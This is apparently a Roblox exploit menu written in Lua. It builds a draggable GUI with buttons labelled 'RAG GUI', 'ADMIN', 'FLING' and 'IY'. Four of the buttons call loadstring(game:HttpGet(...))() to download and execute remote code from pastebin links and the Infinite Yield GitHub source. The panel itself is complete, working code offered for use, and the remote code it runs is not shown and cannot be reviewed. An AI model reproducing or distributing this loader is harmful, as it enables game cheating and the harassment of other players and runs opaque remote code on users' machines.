-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
Frame.BorderSizePixel = 6
Frame.Position = UDim2.new(0, 288, 0, 92)
Frame.Size = UDim2.new(0, 508, 0, 186)

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(104, 104, 104)
TextButton.BorderSizePixel = 6
TextButton.Position = UDim2.new(0, 29, 0, 17)
TextButton.Size = UDim2.new(0, 200, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "RAG GUI"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(104, 104, 104)
TextButton_2.BorderSizePixel = 6
TextButton_2.Position = UDim2.new(0, 32, 0, 85)
TextButton_2.Size = UDim2.new(0, 200, 0, 50)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "ADMIN"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true

TextButton_3.Parent = Frame
TextButton_3.BackgroundColor3 = Color3.fromRGB(104, 104, 104)
TextButton_3.BorderSizePixel = 5
TextButton_3.Position = UDim2.new(0, 281, 0, 85)
TextButton_3.Size = UDim2.new(0, 200, 0, 50)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "FLING"
TextButton_3.TextColor3 = Color3.fromRGB(157, 255, 0)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextStrokeColor3 = Color3.fromRGB(35, 73, 120)
TextButton_3.TextWrapped = true

TextButton_4.Parent = Frame
TextButton_4.BackgroundColor3 = Color3.fromRGB(104, 104, 104)
TextButton_4.BorderSizePixel = 5
TextButton_4.Position = UDim2.new(0.57874012, 0, 0.0913978517, 0)
TextButton_4.Size = UDim2.new(0, 200, 0, 50)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "IY"
TextButton_4.TextColor3 = Color3.fromRGB(157, 255, 0)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextStrokeColor3 = Color3.fromRGB(35, 73, 120)
TextButton_4.TextWrapped = true

-- Scripts:

local function FMEMQ_fake_script() -- TextButton.Script 
	local script = Instance.new('Script', TextButton)

	function parentPressed()
	loadstring(game:HttpGet(('https://pastebin.com/raw/T7weKqag'),true))()	
	end
	script.Parent.MouseButton1Down:Connect(parentPressed)
end
coroutine.wrap(FMEMQ_fake_script)()
local function BJVTID_fake_script() -- TextButton_2.Script 
	local script = Instance.new('Script', TextButton_2)

	function parentPressed()
	loadstring(game:HttpGet("https://pastebin.com/raw/F3JvpCDM",true))()	
	end
	script.Parent.MouseButton1Down:Connect(parentPressed)
end
coroutine.wrap(BJVTID_fake_script)()
local function EOJJELI_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
coroutine.wrap(EOJJELI_fake_script)()
local function NWNBLBO_fake_script() -- TextButton_3.Script 
	local script = Instance.new('Script', TextButton_3)

	function parentPressed()
		loadstring(game:HttpGet("https://pastebin.com/raw/VghwJDq2",true))()
	end
	script.Parent.MouseButton1Down:Connect(parentPressed)
end
coroutine.wrap(NWNBLBO_fake_script)()
local function TYUGFAK_fake_script() -- TextButton_4.Script 
	local script = Instance.new('Script', TextButton_4)

	function parentPressed()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end
	script.Parent.MouseButton1Down:Connect(parentPressed)
end
coroutine.wrap(TYUGFAK_fake_script)()
